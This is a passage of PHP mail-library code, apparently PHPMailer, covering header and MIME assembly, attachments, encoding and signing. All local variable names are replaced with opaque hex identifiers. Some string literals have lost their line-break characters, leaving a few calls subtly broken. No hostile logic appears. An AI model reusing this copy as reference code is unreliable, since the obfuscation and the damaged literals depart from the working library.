$sp470645; if (!$sp7cc3e3) { $sp470645 .= ' '; } $sp470645 .= $spf993c2; if ('' !== $sp144903 && strlen($sp470645) > $spa5d894) { $sp6713e3 .= $sp144903 . $sp83f5e4; $sp470645 = $spf993c2; } } $sp7cc3e3 = false; } $sp6713e3 .= $sp470645 . static::$LE; } return $sp6713e3; } public function utf8CharBoundary($spc49c1b, $sp30a344) { $sp35aafb = false; $spbfac44 = 3; while (!$sp35aafb) { $sp627017 = substr($spc49c1b, $sp30a344 - $spbfac44, $spbfac44); $spc35177 = strpos($sp627017, '='); if (false !== $spc35177) { $sp8e578f = substr($spc49c1b, $sp30a344 - $spbfac44 + $spc35177 + 1, 2); $sp6aeebb = hexdec($sp8e578f); if ($sp6aeebb < 128) { if ($spc35177 > 0) { $sp30a344 -= $spbfac44 - $spc35177; } $sp35aafb = true; } elseif ($sp6aeebb >= 192) { $sp30a344 -= $spbfac44 - $spc35177; $sp35aafb = true; } elseif ($sp6aeebb < 192) { $spbfac44 += 3; } } else { $sp35aafb = true; } } return $sp30a344; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case 'alt': case 'alt_inline': case 'alt_attach': case 'alt_inline_attach': $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $spf988c0 = ''; $spf988c0 .= $this->headerLine('Date', '' === $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ('mail' !== $this->Mailer) { foreach ($this->to as $sp7c6319) { $this->SingleToArray[] = $this->addrFormat($sp7c6319); } } } elseif (count($this->to) > 0) { if ('mail' !== $this->Mailer) { $spf988c0 .= $this->addrAppend('To', $this->to); } } elseif (count($this->cc) === 0) { $spf988c0 .= $this->headerLine('To', 'undisclosed-recipients:;'); } $spf988c0 .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $spf988c0 .= $this->addrAppend('Cc', $this->cc); } if (('sendmail' === $this->Mailer || 'qmail' === $this->Mailer || 'mail' === $this->Mailer) && count($this->bcc) > 0) { $spf988c0 .= $this->addrAppend('Bcc', $this->bcc); } if (count($this->ReplyTo) > 0) { $spf988c0 .= $this->addrAppend('Reply-To', $this->ReplyTo); } if ('mail' !== $this->Mailer) { $spf988c0 .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' !== $this->MessageID && preg_match('/^<.*@.*>$/', $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname()); } $spf988c0 .= $this->headerLine('Message-ID', $this->lastMessageID); if (null !== $this->Priority) { $spf988c0 .= $this->headerLine('X-Priority', $this->Priority); } if ('' !== $this->ConfirmReadingTo) { $spf988c0 .= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>'); } foreach ($this->CustomHeader as $sp03359b) { $spf988c0 .= $this->headerLine(trim($sp03359b[0]), $this->encodeHeader(trim($sp03359b[1]))); } if (!$this->sign_key_file) { $spf988c0 .= $this->headerLine('MIME-Version', '1.0'); $spf988c0 .= $this->getMailMIME(); } return $spf988c0; } public function getMailMIME() { $spf988c0 = ''; $sp63bb5d = true; switch ($this->message_type) { case 'inline': $spf988c0 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spf988c0 .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'attach': case 'inline_attach': case 'alt_attach': case 'alt_inline_attach': $spf988c0 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_MIXED . ';'); $spf988c0 .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'alt': case 'alt_inline': $spf988c0 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spf988c0 .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; default: $spf988c0 .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet); $sp63bb5d = false; break; } if (static::ENCODING_7BIT !== $this->Encoding) { if ($sp63bb5d) { if (static::ENCODING_8BIT === $this->Encoding) { $spf988c0 .= $this->headerLine('Content-Transfer-Encoding', static::ENCODING_8BIT); } } else { $spf988c0 .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding); } } if ('mail' !== $this->Mailer) { } return $spf988c0; } public function getSentMIMEMessage() { return static::stripTrailingWSP($this->MIMEHeader . $this->mailHeader) . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $spbd0a44 = 32; $sp92383e = ''; if (function_exists('random_bytes')) { try { $sp92383e = random_bytes($spbd0a44); } catch (\Exception $sp7eefec) { } } elseif (function_exists('openssl_random_pseudo_bytes')) { $sp92383e = openssl_random_pseudo_bytes($spbd0a44); } if ($sp92383e === '') { $sp92383e = hash('sha256', uniqid((string) mt_rand(), true), true); } return str_replace(array('=', '+', '/'), '', base64_encode(hash('sha256', $sp92383e, true))); } public function createBody() { $spd76997 = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = 'b1_' . $this->uniqueid; $this->boundary[2] = 'b2_' . $this->uniqueid; $this->boundary[3] = 'b3_' . $this->uniqueid; if ($this->sign_key_file) { $spd76997 .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $sp258920 = $this->Encoding; $sp7eda71 = $this->CharSet; if (static::ENCODING_8BIT === $sp258920 && !$this->has8bitChars($this->Body)) { $sp258920 = static::ENCODING_7BIT; $sp7eda71 = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $this->Encoding && static::hasLineLongerThanMax($this->Body)) { $sp258920 = static::ENCODING_QUOTED_PRINTABLE; } $sp4011aa = $this->Encoding; $sp6ffe1b = $this->CharSet; if (static::ENCODING_8BIT === $sp4011aa && !$this->has8bitChars($this->AltBody)) { $sp4011aa = static::ENCODING_7BIT; $sp6ffe1b = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $sp4011aa && static::hasLineLongerThanMax($this->AltBody)) { $sp4011aa = static::ENCODING_QUOTED_PRINTABLE; } $sp4cc3c2 = 'This is a multi-part message in MIME format.' . static::$LE . static::$LE; switch ($this->message_type) { case 'inline': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->getBoundary($this->boundary[1], $sp7eda71, '', $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('inline', $this->boundary[1]); break; case 'attach': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->getBoundary($this->boundary[1], $sp7eda71, '', $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'inline_attach': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->textLine('--' . $this->boundary[1]); $spd76997 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spd76997 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spd76997 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[2], $sp7eda71, '', $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('inline', $this->boundary[2]); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->getBoundary($this->boundary[1], $sp6ffe1b, static::CONTENT_TYPE_PLAINTEXT, $sp4011aa); $spd76997 .= $this->encodeString($this->AltBody, $sp4011aa); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[1], $sp7eda71, static::CONTENT_TYPE_TEXT_HTML, $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; if (!empty($this->Ical)) { $sp027106 = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $sp6be373) { if (stripos($this->Ical, 'METHOD:' . $sp6be373) !== false) { $sp027106 = $sp6be373; break; } } $spd76997 .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $sp027106, ''); $spd76997 .= $this->encodeString($this->Ical, $this->Encoding); $spd76997 .= static::$LE; } $spd76997 .= $this->endBoundary($this->boundary[1]); break; case 'alt_inline': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->getBoundary($this->boundary[1], $sp6ffe1b, static::CONTENT_TYPE_PLAINTEXT, $sp4011aa); $spd76997 .= $this->encodeString($this->AltBody, $sp4011aa); $spd76997 .= static::$LE; $spd76997 .= $this->textLine('--' . $this->boundary[1]); $spd76997 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spd76997 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spd76997 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[2], $sp7eda71, static::CONTENT_TYPE_TEXT_HTML, $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('inline', $this->boundary[2]); $spd76997 .= static::$LE; $spd76997 .= $this->endBoundary($this->boundary[1]); break; case 'alt_attach': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->textLine('--' . $this->boundary[1]); $spd76997 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spd76997 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[2], $sp6ffe1b, static::CONTENT_TYPE_PLAINTEXT, $sp4011aa); $spd76997 .= $this->encodeString($this->AltBody, $sp4011aa); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[2], $sp7eda71, static::CONTENT_TYPE_TEXT_HTML, $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; if (!empty($this->Ical)) { $sp027106 = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $sp6be373) { if (stripos($this->Ical, 'METHOD:' . $sp6be373) !== false) { $sp027106 = $sp6be373; break; } } $spd76997 .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $sp027106, ''); $spd76997 .= $this->encodeString($this->Ical, $this->Encoding); } $spd76997 .= $this->endBoundary($this->boundary[2]); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt_inline_attach': $spd76997 .= $sp4cc3c2; $spd76997 .= $this->textLine('--' . $this->boundary[1]); $spd76997 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spd76997 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[2], $sp6ffe1b, static::CONTENT_TYPE_PLAINTEXT, $sp4011aa); $spd76997 .= $this->encodeString($this->AltBody, $sp4011aa); $spd76997 .= static::$LE; $spd76997 .= $this->textLine('--' . $this->boundary[2]); $spd76997 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spd76997 .= $this->textLine(' boundary="' . $this->boundary[3] . '";'); $spd76997 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spd76997 .= static::$LE; $spd76997 .= $this->getBoundary($this->boundary[3], $sp7eda71, static::CONTENT_TYPE_TEXT_HTML, $sp258920); $spd76997 .= $this->encodeString($this->Body, $sp258920); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('inline', $this->boundary[3]); $spd76997 .= static::$LE; $spd76997 .= $this->endBoundary($this->boundary[2]); $spd76997 .= static::$LE; $spd76997 .= $this->attachAll('attachment', $this->boundary[1]); break; default: $this->Encoding = $sp258920; $spd76997 .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $spd76997 = ''; if ($this->exceptions) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined('PKCS7_TEXT')) { throw new Exception($this->lang('extension_missing') . 'openssl'); } $sp5601c4 = tempnam(sys_get_temp_dir(), 'srcsign'); $sp2d18e0 = tempnam(sys_get_temp_dir(), 'mailsign'); file_put_contents($sp5601c4, $spd76997); if (empty($this->sign_extracerts_file)) { $spa818dc = @openssl_pkcs7_sign($sp5601c4, $sp2d18e0, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $spa818dc = @openssl_pkcs7_sign($sp5601c4, $sp2d18e0, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } @unlink($sp5601c4); if ($spa818dc) { $spd76997 = file_get_contents($sp2d18e0); @unlink($sp2d18e0); $sp3b4706 = explode('

', $spd76997, 2); $this->MIMEHeader .= $sp3b4706[0] . static::$LE . static::$LE; $spd76997 = $sp3b4706[1]; } else { @unlink($sp2d18e0); throw new Exception($this->lang('signing') . openssl_error_string()); } } catch (Exception $spa08c34) { $spd76997 = ''; if ($this->exceptions) { throw $spa08c34; } } } return $spd76997; } protected function getBoundary($spc1f3f6, $sp71c290, $sp89c884, $sp8531d0) { $spf988c0 = ''; if ('' === $sp71c290) { $sp71c290 = $this->CharSet; } if ('' === $sp89c884) { $sp89c884 = $this->ContentType; } if ('' === $sp8531d0) { $sp8531d0 = $this->Encoding; } $spf988c0 .= $this->textLine('--' . $spc1f3f6); $spf988c0 .= sprintf('Content-Type: %s; charset=%s', $sp89c884, $sp71c290); $spf988c0 .= static::$LE; if (static::ENCODING_7BIT !== $sp8531d0) { $spf988c0 .= $this->headerLine('Content-Transfer-Encoding', $sp8531d0); } $spf988c0 .= static::$LE; return $spf988c0; } protected function endBoundary($spc1f3f6) { return static::$LE . '--' . $spc1f3f6 . '--' . static::$LE; } protected function setMessageType() { $sp84b96c = array(); if ($this->alternativeExists()) { $sp84b96c[] = 'alt'; } if ($this->inlineImageExists()) { $sp84b96c[] = 'inline'; } if ($this->attachmentExists()) { $sp84b96c[] = 'attach'; } $this->message_type = implode('_', $sp84b96c); if ('' === $this->message_type) { $this->message_type = 'plain'; } } public function headerLine($spdeeed8, $spf2f6fc) { return $spdeeed8 . ': ' . $spf2f6fc . static::$LE; } public function textLine($spf2f6fc) { return $spf2f6fc . static::$LE; } public function addAttachment($sp9e5935, $spdeeed8 = '', $sp8531d0 = self::ENCODING_BASE64, $sp84b96c = '', $spc6ea88 = 'attachment') { try { if (!static::isPermittedPath($sp9e5935) || !@is_file($sp9e5935) || !is_readable($sp9e5935)) { throw new Exception($this->lang('file_access') . $sp9e5935, self::STOP_CONTINUE); } if ('' === $sp84b96c) { $sp84b96c = static::filenameToType($sp9e5935); } $spc11822 = (string) static::mb_pathinfo($sp9e5935, PATHINFO_BASENAME); if ('' === $spdeeed8) { $spdeeed8 = $spc11822; } if (!$this->validateEncoding($sp8531d0)) { throw new Exception($this->lang('encoding') . $sp8531d0); } $this->attachment[] = array(0 => $sp9e5935, 1 => $spc11822, 2 => $spdeeed8, 3 => $sp8531d0, 4 => $sp84b96c, 5 => false, 6 => $spc6ea88, 7 => $spdeeed8); } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); $this->edebug($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($sp0f5c49, $spc1f3f6) { $sp5ced66 = array(); $sp5b650e = array(); $sp397ec1 = array(); foreach ($this->attachment as $sp0f4801) { if ($sp0f4801[6] === $sp0f5c49) { $spccb6f7 = ''; $sp9e5935 = ''; $sp9bd714 = $sp0f4801[5]; if ($sp9bd714) { $spccb6f7 = $sp0f4801[0]; } else { $sp9e5935 = $sp0f4801[0]; } $spff2f5e = hash('sha256', serialize($sp0f4801)); if (in_array($spff2f5e, $sp397ec1, true)) { continue; } $sp397ec1[] = $spff2f5e; $spdeeed8 = $sp0f4801[2]; $sp8531d0 = $sp0f4801[3]; $sp84b96c = $sp0f4801[4]; $spc6ea88 = $sp0f4801[6]; $sp38727a = $sp0f4801[7]; if ('inline' === $spc6ea88 && array_key_exists($sp38727a, $sp5b650e)) { continue; } $sp5b650e[$sp38727a] = true; $sp5ced66[] = sprintf('--%s%s', $spc1f3f6, static::$LE); if (!empty($spdeeed8)) { $sp5ced66[] = sprintf('Content-Type: %s; name=%s%s', $sp84b96c, static::quotedString($this->encodeHeader($this->secureHeader($spdeeed8))), static::$LE); } else { $sp5ced66[] = sprintf('Content-Type: %s%s', $sp84b96c, static::$LE); } if (static::ENCODING_7BIT !== $sp8531d0) { $sp5ced66[] = sprintf('Content-Transfer-Encoding: %s%s', $sp8531d0, static::$LE); } if ((string) $sp38727a !== '' && $spc6ea88 === 'inline') { $sp5ced66[] = 'Content-ID: <' . $this->encodeHeader($this->secureHeader($sp38727a)) . '>' . static::$LE; } if (!empty($spc6ea88)) { $spd3f6b8 = $this->encodeHeader($this->secureHeader($spdeeed8)); if (!empty($spd3f6b8)) { $sp5ced66[] = sprintf('Content-Disposition: %s; filename=%s%s', $spc6ea88, static::quotedString($spd3f6b8), static::$LE . static::$LE); } else { $sp5ced66[] = sprintf('Content-Disposition: %s%s', $spc6ea88, static::$LE . static::$LE); } } else { $sp5ced66[] = static::$LE; } if ($sp9bd714) { $sp5ced66[] = $this->encodeString($spccb6f7, $sp8531d0); } else { $sp5ced66[] = $this->encodeFile($sp9e5935, $sp8531d0); } if ($this->isError()) { return ''; } $sp5ced66[] = static::$LE; } } $sp5ced66[] = sprintf('--%s--%s', $spc1f3f6, static::$LE); return implode('', $sp5ced66); } protected function encodeFile($sp9e5935, $sp8531d0 = self::ENCODING_BASE64) { try { if (!static::isPermittedPath($sp9e5935) || !file_exists($sp9e5935) || !is_readable($sp9e5935)) { throw new Exception($this->lang('file_open') . $sp9e5935, self::STOP_CONTINUE); } $spa0d505 = file_get_contents($sp9e5935); if (false === $spa0d505) { throw new Exception($this->lang('file_open') . $sp9e5935, self::STOP_CONTINUE); } $spa0d505 = $this->encodeString($spa0d505, $sp8531d0); return $spa0d505; } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); $this->edebug($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return ''; } } public function encodeString($speadb40, $sp8531d0 = self::ENCODING_BASE64) { $sp9343b7 = ''; switch (strtolower($sp8531d0)) { case static::ENCODING_BASE64: $sp9343b7 = chunk_split(base64_encode($speadb40), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $sp9343b7 = static::normalizeBreaks($speadb40); if (substr($sp9343b7, -strlen(static::$LE)) !== static::$LE) { $sp9343b7 .= static::$LE; } break; case static::ENCODING_BINARY: $sp9343b7 = $speadb40; break; case static::ENCODING_QUOTED_PRINTABLE: $sp9343b7 = $this->encodeQP($speadb40); break; default: $this->setError($this->lang('encoding') . $sp8531d0); if ($this->exceptions) { throw new Exception($this->lang('encoding') . $sp8531d0); } break; } return $sp9343b7; } public function encodeHeader($speadb40, $sp0d1a31 = 'text') { $spb9d761 = 0; switch (strtolower($sp0d1a31)) { case 'phrase': if (!preg_match('/[\\200-\\377]/', $speadb40)) { $sp9343b7 = addcslashes($speadb40, ' ..\\"'); if ($speadb40 === $sp9343b7 && !preg_match('/[^A-Za-z0-9!#$%&\'*+\\/=?^_`{|}~ -]/', $speadb40)) { return $sp9343b7; } return "\"{$sp9343b7}\""; } $spb9d761 = preg_match_all('/[^\\040\\041\\043-\\133\\135-\\176]/', $speadb40, $spa4f5d9); break; case 'comment': $spb9d761 = preg_match_all('/[()"]/', $speadb40, $spa4f5d9); case 'text': default: $spb9d761 += preg_match_all('/[\\000-\\010\\013\\014\\016-\\037\\177-\\377]/', $speadb40, $spa4f5d9); break; } if ($this->has8bitChars($speadb40)) { $sp4a8c96 = $this->CharSet; } else { $sp4a8c96 = static::CHARSET_ASCII; } $spf4d1df = 8 + strlen($sp4a8c96); if ('mail' === $this->Mailer) { $sp371225 = static::MAIL_MAX_LINE_LENGTH - $spf4d1df; } else { $sp371225 = static::MAX_LINE_LENGTH - $spf4d1df; } if ($spb9d761 > strlen($speadb40) / 3) { $sp8531d0 = 'B'; } elseif ($spb9d761 > 0) { $sp8531d0 = 'Q'; } elseif (strlen($speadb40) > $sp371225) { $sp8531d0 = 'Q'; } else { $sp8531d0 = false; } switch ($sp8531d0) { case 'B': if ($this->hasMultiBytes($speadb40)) { $sp9343b7 = $this->base64EncodeWrapMB($speadb40, '
'); } else { $sp9343b7 = base64_encode($speadb40); $sp371225 -= $sp371225 % 4; $sp9343b7 = trim(chunk_split($sp9343b7, $sp371225, '
')); } $sp9343b7 = preg_replace('/^(.*)$/m', ' =?' . $sp4a8c96 . "?{$sp8531d0}?\\1?=", $sp9343b7); break; case 'Q': $sp9343b7 = $this->encodeQ($speadb40, $sp0d1a31); $sp9343b7 = $this->wrapText($sp9343b7, $sp371225, true); $sp9343b7 = str_replace('=' . static::$LE, '
', trim($sp9343b7)); $sp9343b7 = preg_replace('/^(.*)$/m', ' =?' . $sp4a8c96 . "?{$sp8531d0}?\\1?=", $sp9343b7); break; default: return $speadb40; } return trim(static::normalizeBreaks($sp9343b7)); } public function hasMultiBytes($speadb40) { if (function_exists('mb_strlen')) { return strlen($speadb40) > mb_strlen($speadb40, $this->CharSet); } return false; } public function has8bitChars($sp891292) { return (bool) preg_match('/[\\x80-\\xFF]/', $sp891292); } public function base64EncodeWrapMB($speadb40, $sp3b76cf = null) { $sp2c9fb4 = '=?' . $this->CharSet . '?B?'; $sp6615b6 = '?='; $sp9343b7 = ''; if (null === $sp3b76cf) { $sp3b76cf = static::$LE; } $sp880086 = mb_strlen($speadb40, $this->CharSet); $spa5d894 = 75 - strlen($sp2c9fb4) - strlen($sp6615b6); $sp361253 = $sp880086 / strlen($speadb40); $spdb2a1e = floor($spa5d894 * $sp361253 * 0.75); $sp58c4fc = 0; for ($sp9f800d = 0; $sp9f800d < $sp880086; $sp9f800d += $sp58c4fc) { $spbfac44 = 0; do { $sp58c4fc = $spdb2a1e - $spbfac44; $sp42bce6 = mb_substr($speadb40, $sp9f800d, $sp58c4fc, $this->CharSet); $sp42bce6 = base64_encode($sp42bce6); ++$spbfac44; } while (strlen($sp42bce6) > $spa5d894); $sp9343b7 .= $sp42bce6 . $sp3b76cf; } return substr($sp9343b7, 0, -strlen($sp3b76cf)); } public function encodeQP($spccb6f7) { return static::normalizeBreaks(quoted_printable_encode($spccb6f7)); } public function encodeQ($speadb40, $sp0d1a31 = 'text') { $sp1dad15 = ''; $sp9343b7 = str_replace(array('', '
'), '', $speadb40); switch (strtolower($sp0d1a31)) { case 'phrase': $sp1dad15 = '^A-Za-z0-9!*+\\/ -'; break; case 'comment': $sp1dad15 = '\\(\\)"'; case 'text': default: $sp1dad15 = '\\000-\\011\\013\\014\\016-\\037\\075\\077\\137\\177-\\377' . $sp1dad15; break; } $spa4f5d9 = array(); if (preg_match_all("/[{$sp1dad15}]/", $sp9343b7, $spa4f5d9)) { $spf67c7f = array_search('=', $spa4f5d9[0], true); if (false !== $spf67c7f) { unset($spa4f5d9[0][$spf67c7f]); array_unshift($spa4f5d9[0], '='); } foreach (array_unique($spa4f5d9[0]) as $spcaa699) { $sp9343b7 = str_replace($spcaa699, '=' . sprintf('%02X', ord($spcaa699)), $sp9343b7); } } return str_replace(' ', '_', $sp9343b7); } public function addStringAttachment($spccb6f7, $spc11822, $sp8531d0 = self::ENCODING_BASE64, $sp84b96c = '', $spc6ea88 = 'attachment') { try { if ('' === $sp84b96c) { $sp84b96c = static::filenameToType($spc11822); } if (!$this->validateEncoding($sp8531d0)) { throw new Exception($this->lang('encoding') . $sp8531d0); } $this->attachment[] = array(0 => $spccb6f7, 1 => $spc11822, 2 => static::mb_pathinfo($spc11822, PATHINFO_BASENAME), 3 => $sp8531d0, 4 => $sp84b96c, 5 => true, 6 => $spc6ea88, 7 => 0); } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); $this->edebug($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return false; } return true; } public function addEmbeddedImage($sp9e5935, $sp38727a, $spdeeed8 = '', $sp8531d0 = self::ENCODING_BASE64, $sp84b96c = '', $spc6ea88 = 'inline') { try { if (!static::isPermittedPath($sp9e5935) || !@is_file($sp9e5935) || !is_readable($sp9e5935)) { throw new Exception($this->lang('file_access') . $sp9e5935, self::STOP_CONTINUE); } if ('' === $sp84b96c) { $sp84b96c = static::filenameToType($sp9e5935); } if (!$this->validateEncoding($sp8531d0)) { throw new Exception($this->lang('encoding') . $sp8531d0); } $spc11822 = (string) static::mb_pathinfo($sp9e5935, PATHINFO_BASENAME); if ('' === $spdeeed8) { $spdeeed8 = $spc11822; } $this->attachment[] = array(0 => $sp9e5935, 1 => $spc11822, 2 => $spdeeed8, 3 => $sp8531d0, 4 => $sp84b96c, 5 => false, 6 => $spc6ea88, 7 => $sp38727a); } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); $this->edebug($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return false; } return true; } public function addStringEmbeddedImage($spccb6f7, $sp38727a, $spdeeed8 = '', $sp8531d0 = self::ENCODING_BASE64, $sp84b96c = '', $spc6ea88 = 'inline') { try { if ('' === $sp84b96c && !empty($spdeeed8)) { $sp84b96c = static::filenameToType($spdeeed8); } if (!$this->validateEncoding($sp8531d0)) { throw new Exception($this->lang('encoding') . $sp8531d0); } $this->attachment[] = array(0 => $spccb6f7, 1 => $spdeeed8, 2 => $spdeeed8, 3 => $sp8531d0, 4 => $sp84b96c, 5 => true, 6 => $spc6ea88, 7 => $sp38727a); } catch (Exception $spa08c34) { $this->setError($spa08c34->getMessage()); $this->edebug($spa08c34->getMessage()); if ($this->exceptions) { throw $spa08c34; } return false; } return true; } protected function validateEncoding($sp8531d0) { return in_array($sp8531d0, array(self::ENCODING_7BIT, self::ENCODING_QUOTED_PRINTABLE, self::ENCODING_BASE64, self::ENCODING_8BIT, self::ENCODING_BINARY), true); } protected function cidExists($sp38727a) { foreach ($this->attachment as $sp0f4801) { if ('inline' === $sp0f4801[6] && $sp38727a === $sp0f4801[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $sp0f4801) { if ('inline' === $sp0f4801[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $sp0f4801) { if ('attachment' === $sp0f4801[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($spe50020) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, static function ($sp7d456c) use($spe50020) { return $sp7d456c[0] !== $spe50020; }); } public function clearAddresses() { foreach ($this->to as $spab1114) { unset($this->all_recipients[strtolower($spab1114[0])]); } $this->to = array(); $this->clearQueuedAddresses('to'); } public function clearCCs() { foreach ($this->cc as $sp372894) { unset($this->all_recipients[strtolower($sp372894[0])]); } $this->cc = array(); $this->clearQueuedAddresses('cc'); } public function clearBCCs() { foreach ($this->bcc as $sp1edd4b) { unset($this->all_recipients[strtolower($sp1edd4b[0])]); } $this->bcc = array(); $this->clearQueuedAddresses('bcc'); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($sp84996a) { ++$this->error_count; if ('smtp' === $this->Mailer && null !== $this->smtp) { $sp582d3f = $this->smtp->getError(); if (!empty($sp582d3f['error'])) { $sp84996a .= $this->lang('smtp_error') . $sp582d3f['error']; if (!empty($sp582d3f['detail'])) { $sp84996a .= ' Detail: ' . $sp582d3f['detail']; } if (!empty($sp582d3f['smtp_code'])) { $sp84996a .= ' SMTP code: ' . $sp582d3f['smtp_code']; } if (!empty($sp582d3f['smtp_code_ex'])) { $sp84996a .= ' Additional SMTP info: ' . $sp582d3f['smtp_code_ex']; } } } $this->ErrorInfo = $sp84996a; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date('D, j M Y H:i:s O'); } protected function serverHostname() { $spf988c0 = ''; if (!empty($this->Hostname)) { $spf988c0 = $this->Hostname; } elseif (isset($_SERVER) && array_key_exists('SERVER_NAME', $_SERVER)) { $spf988c0 = $_SERVER['SERVER_NAME']; } elseif (function_exists('gethostname') && gethostname() !== false) { $spf988c0 = gethostname(); } elseif (php_uname('n') !== false) { $spf988c0 = php_uname('n'); } if (!static::isValidHost($spf988c0)) { return 'localhost.localdomain'; } return $spf988c0; } public static function isValidHost($sp843aa1) { if (empty($sp843aa1) || !is_string($sp843aa1) || strlen($sp843aa1) > 256 || !preg_match('/^([a-zA-Z\\d.-]*|\\[[a-fA-F\\d:]+])$/', $sp843aa1)) { return false; } if (strlen($sp843aa1) > 2 && substr($sp843aa1, 0, 1) === '[' && substr($sp843aa1, -1, 1) === ']') { return filter_var(substr($sp843aa1, 1, -1), FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) !== false; } if (is_numeric(str_replace('.', '', $sp843aa1))) { return filter_var($sp843aa1, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false; } if (filter_var('http://' . $sp843aa1, FILTER_VALIDATE_URL) 